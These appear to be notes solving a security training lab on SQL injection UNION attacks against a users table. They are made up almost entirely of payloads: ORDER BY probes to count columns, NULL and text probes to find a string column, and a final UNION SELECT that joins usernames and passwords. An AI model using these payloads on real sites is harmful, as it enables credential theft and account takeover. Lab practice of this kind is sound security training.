Lab: SQL injection UNION attack, retrieving multiple values in a single column


To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 


The database contains a different table called users,
called username and password. 

Determine number of columns

' order by 1-- okay

' order by 3-- Error so 3-1=2 columns

Determine the type

' UNION SELECT NULL , NULL-- okay

' UNION SELECT 'a' , 'a'--  Error

' UNION SELECT 'a' , NULL--  Error

' UNION SELECT NULL , 'a'-- okay

so second column can get text

Determine the users and passwords

' UNION SELECT NULL , username || '  ' || password FROM users--
